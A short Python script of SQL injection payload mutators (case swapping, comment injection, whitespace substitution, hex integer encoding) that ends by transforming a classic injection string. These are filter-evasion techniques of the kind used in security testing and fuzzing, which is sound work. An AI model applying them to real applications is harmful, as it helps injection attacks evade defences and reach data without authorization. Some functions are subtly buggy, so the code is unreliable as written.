import random
import re

def random_string(length):
    #generate a random string of length 'length'
    #e.g. random_string(5) -> 'aBcDe'
    dictionary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.choice(dictionary) for i in range(random.randint(1,length)))

def case_swapping(payload):
    #randomly swap the case of the payload
    #e.g. 'aBc' -> 'AbC'
    new_payload =[]
    for char in payload:
        if random.randint(0,1):
            new_payload.append(char.upper())
        else:
            new_payload.append(char.lower())
    return ''.join(new_payload)

def comment_injection(payload):
    #randomly inject a comment into the payload
    #e.g. 'aBc' -> 'aBc--' or 'aBc#' or 'aBc/*abc*/'
    for char in payload:
        #if char is space, tab, newline, carriage return, form feed, or vertical tab, then add a comment
        if char in [' ', '\t', '\n', '\r', '\f', '\v']:
            if random.randint(0,1):
                payload = payload[:payload.index(char)] + "/*" + random_string(6) + "*/" + payload[payload.index(char):]
    if random.randint(0,1):
        payload = payload + '--' + random_string(6)
    else:
        payload = payload + '#' + random_string(6)

    return payload
    

def comment_rewriting(payload):
    #randomly rewrite the payload as a comment
    #e.g. '# or -- ' -> '#aNd or -- aNd'
    if ('#' in payload or '--' in payload):
        payload = payload + random_string(6)
    if ('*/' in payload):
        payload = payload.replace('*/', random_string(6) + '*/')
    return payload

def whitespace_substitution(payload):
    #randomly substitute whitespace 
    #e.g. 'a b'' -> 'a \t b'
    whitespace = [' ', '\t', '\n', '\r', '\f', '\v']
    new_payload = []
    for char in payload:
        if char in whitespace:
            new_payload.append(random.choice(whitespace))
        else:
            new_payload.append(char)
    return ''.join(new_payload)

def integer_encoding(payload):
    #change decimal to hex
    #e.g. '123' -> '0x7b'
    #search for decimal in payload
    decimal = re.findall(r'\d+', payload)
    for d in decimal:
        payload = payload.replace(d, '0x' + hex(int(d))[2:])
    return payload

print(integer_encoding('admin\' or 123=1'))

    